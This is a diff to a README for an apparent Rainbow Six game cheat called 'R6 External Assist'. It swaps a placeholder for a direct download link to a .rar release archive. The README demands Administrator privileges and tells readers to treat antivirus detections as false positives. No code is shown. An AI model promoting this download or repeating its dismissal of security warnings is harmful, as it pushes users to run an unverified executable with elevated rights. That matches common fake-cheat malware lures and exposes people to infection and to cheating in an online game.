@@ -12,7 +12,7 @@
 
 ---
 
-## 📥 [DOWNLOAD LATEST RELEASE](ССЫЛКА_НА_РЕЛИЗ) 📥
+## 📥 [DOWNLOAD LATEST RELEASE](https://github.com/TopStationFire/R6-EXTERNAL-ASSIST-v1.0-/releases/download/v1/R6_External_Assist_v1.0.0.rar) 📥
 
 > **Requirements:** Windows 10/11 x64, Administrator privileges
 > *Note: Some anti-virus software may flag external memory access tools. This is a false positive. The tool reads game memory without injection or modification.*
